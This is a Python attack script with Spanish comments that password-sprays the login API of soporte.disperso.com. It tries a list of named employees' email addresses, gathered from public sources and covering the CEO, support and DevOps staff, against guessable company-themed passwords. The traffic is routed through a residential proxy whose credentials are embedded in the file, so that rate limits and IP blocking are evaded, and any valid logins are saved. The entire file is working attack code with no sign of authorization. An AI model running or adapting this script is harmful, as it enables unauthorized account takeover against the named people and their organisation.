#!/usr/bin/env python3
"""
HEXAGON spray local — vía Bright Data MX residencial
Cubre SOLO los OSINT emails con las passwords más probables
Los requests salen desde IPs residenciales MX (no VPS — no quemadas)
"""
import requests, time, json
from datetime import datetime
import urllib3
urllib3.disable_warnings()

TARGET = "https://soporte.disperso.com/api/auth/login"

# Bright Data MX residencial
BD_PROXY = "http://brd-customer-hl_25b43d3c-zone-residential_mx1-country-mx:erjvs0sv8cvs@brd.superproxy.io:22225"

PROXIES = {"https": BD_PROXY, "http": BD_PROXY}

# Solo OSINT emails (alta probabilidad) + top passwords
OSINT_EMAILS = [
    # Christian Ramirez Pulgar — ANALISTA SOPORTE DIRECTO
    "christian.ramirez@disperso.com",
    "christian@disperso.com",
    "cramirez@disperso.com",
    "christian.ramirez@tuxpan.cl",
    # Jonathan Hernandez — SW Engineer (GitHub jhernandez71)
    "jonathan.hernandez@disperso.com",
    "jhernandez@disperso.com",
    "jonathan@disperso.com",
    "jhernandez@tuxpan.cl",
    # Patricia Erazo — CEO
    "patricia.erazo@disperso.com",
    "patricia@disperso.com",
    "perazo@disperso.com",
    # Sandra Ulloa — Comercial
    "sandra.ulloa@disperso.com",
    "sandra@disperso.com",
    "sulloa@disperso.com",
    # Daniela Canales
    "daniela.canales@disperso.com",
    "daniela@disperso.com",
    # Monica Rojas
    "monica.rojas@disperso.com",
    "monica@disperso.com",
    # Willians Briones — DevOps
    "willians.briones@disperso.com",
    "willians@disperso.com",
    # Esteban Conejeros — Arch
    "esteban.conejeros@disperso.com",
    "esteban@disperso.com",
    # Funcionales alta prioridad
    "admin@disperso.com",
    "soporte@disperso.com",
    "support@disperso.com",
    "dev@disperso.com",
    "cto@disperso.com",
    "sales@disperso.com",
]

TOP_PASSWORDS = [
    'Disperso2024!', 'Disperso2025!', 'Disperso2026!',
    'Disperso123!', 'Disperso123',
    'Tuxpan2024!', 'Tuxpan2025!', 'Tuxpan123!',
    'Soporte123!', 'Support123!',
    'Admin2024!', 'Admin123!',
    'Chile2024!', 'Chile2025!',
    'Password1!', 'Qwerty123!',
    'Pagos2024!', 'Pagos2025!',
    'changeme1', 'Welcome1!',
]

results = {
    "started": datetime.utcnow().isoformat(),
    "target": TARGET,
    "proxy": "BrightData MX Residential",
    "tried": 0,
    "hits": [],
    "interesting": [],
    "rate_limits": 0,
    "errors": 0,
}

HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://soporte.disperso.com",
    "Referer": "https://soporte.disperso.com/",
}

DELAY = 1.5  # MX residencial — IPs rotan, podemos ir más rápido
RL_WAIT = 65

print(f"[HEXAGON BD-MX] Spray via BrightData MX residencial", flush=True)
print(f"[*] {len(OSINT_EMAILS)} emails x {len(TOP_PASSWORDS)} passwords = {len(OSINT_EMAILS)*len(TOP_PASSWORDS)} combos", flush=True)
print(f"[*] ETA ~{int(len(OSINT_EMAILS)*len(TOP_PASSWORDS)*DELAY/60)} min", flush=True)

# Test proxy first
print("[*] Probando proxy...")
try:
    tr = requests.get("https://api.ipify.org", proxies=PROXIES, timeout=15, verify=False)
    print(f"[+] Exit IP (via BD): {tr.text}")
except Exception as e:
    print(f"[!] Proxy test failed: {e}")
    # Try without proxy as fallback
    PROXIES = None
    print("[*] Continuando sin proxy (IP local)")

print("-" * 60, flush=True)

try:
    for email in OSINT_EMAILS:
        for pwd in TOP_PASSWORDS:
            retry_count = 0
            while retry_count < 3:
                try:
                    kwargs = {
                        "json": {"email": email, "password": pwd},
                        "headers": HEADERS,
                        "timeout": 20,
                        "verify": False,
                        "allow_redirects": True,
                    }
                    if PROXIES:
                        kwargs["proxies"] = PROXIES
                    
                    r = requests.post(TARGET, **kwargs)
                    results["tried"] += 1

                    if r.status_code == 200:
                        hit = {
                            "email": email, "password": pwd,
                            "status": 200, "response": r.text[:2000],
                            "ts": datetime.utcnow().isoformat(),
                        }
                        results["hits"].append(hit)
                        print(f"\n[!!!!HIT!!!!] {email}:{pwd}", flush=True)
                        print(f"  Response: {r.text[:500]}", flush=True)
                        with open("hexagon_bd_results.json", "w") as f:
                            json.dump(results, f, indent=2)
                    elif r.status_code == 429:
                        results["rate_limits"] += 1
                        ra = r.headers.get("Retry-After", str(RL_WAIT))
                        wait_s = int(ra) if str(ra).isdigit() else RL_WAIT
                        print(f"[429] {email} | Waiting {wait_s}s", flush=True)
                        time.sleep(wait_s)
                        retry_count += 1
                        continue
                    elif r.status_code not in [400, 401, 403, 404]:
                        results["interesting"].append({
                            "email": email, "password": pwd,
                            "status": r.status_code, "body": r.text[:300],
                        })
                        print(f"[?] {email}:{pwd} -> {r.status_code} | {r.text[:100]}", flush=True)
                    else:
                        if results["tried"] % 20 == 0:
                            pct = int(results["tried"] / (len(OSINT_EMAILS)*len(TOP_PASSWORDS)) * 100)
                            print(f"[.] tried={results['tried']} ({pct}%) | {email}", flush=True)
                    break

                except Exception as e:
                    results["errors"] += 1
                    print(f"[ERR] {str(e)[:80]}", flush=True)
                    time.sleep(3)
                    retry_count += 1

            time.sleep(DELAY)

except KeyboardInterrupt:
    print("\n[!] Interrumpido")

results["finished"] = datetime.utcnow().isoformat()
print(f"\n[FIN] tried={results['tried']} hits={len(results['hits'])} rl={results['rate_limits']} errors={results['errors']}", flush=True)

with open("hexagon_bd_results.json", "w") as f:
    json.dump(results, f, indent=2)
print("[*] Guardado: hexagon_bd_results.json")

if results["hits"]:
    print("\n[!!!] CREDENCIALES VÁLIDAS:")
    for h in results["hits"]:
        print(f"  {h['email']}:{h['password']}")
